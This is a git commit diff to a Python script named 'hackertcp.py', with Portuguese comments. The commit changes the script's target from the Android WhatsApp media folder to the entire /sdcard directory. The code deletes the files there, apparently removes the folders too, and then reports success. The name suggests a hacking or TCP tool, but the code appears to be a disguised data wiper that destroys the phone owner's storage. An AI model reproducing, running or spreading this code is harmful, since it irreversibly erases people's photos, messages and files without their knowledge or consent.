335ba0c21a4792a55eec1002e0495fa77b369571
snowfelps <123759120+snowfelps@users.noreply.github.com>
2023-09-29 20:37:53 -0300

    Update hackertcp.py

--- hackertcp.py
+++ hackertcp.py
@@ -4,12 +4,12 @@ import os
 import shutil
 
 # Caminho do diretório a ser excluído
-diretorio_whatsapp = '/sdcard/Android/media/com.whatsapp'
+diretorio_sdcard = '/sdcard'
 
 try:
-    # Remover todos os arquivos no diretório
-    for filename in os.listdir(diretorio_whatsapp):
-        file_path = os.path.join(diretorio_whatsapp, filename)
+    # Remover todos os arquivos e diretórios no diretório
+    for filename in os.listdir(diretorio_sdcard):
+        file_path = os.path.join(diretorio_sdcard, filename)
         try:
             if os.path.isfile(file_path) or os.path.islink(file_path):
                 os.unlink(file_path)
@@ -19,7 +19,7 @@ try:
             print("Erro ao excluir", file_path, ":", e)
 
     # Tentar excluir o diretório agora
-    os.rmdir(diretorio_whatsapp)
-    print("Diretório", diretorio_whatsapp, "whatsapp Exluido pasta com susseso.")
+    os.rmdir(diretorio_sdcard)
+    print("Diretório", diretorio_sdcard, "excluído com sucesso.")
 except Exception as e:
-    print("Ocorreu um erro ", diretorio_whatsapp, ":", e)
+    print("Ocorreu um erro ao excluir", diretorio_sdcard, ":", e)
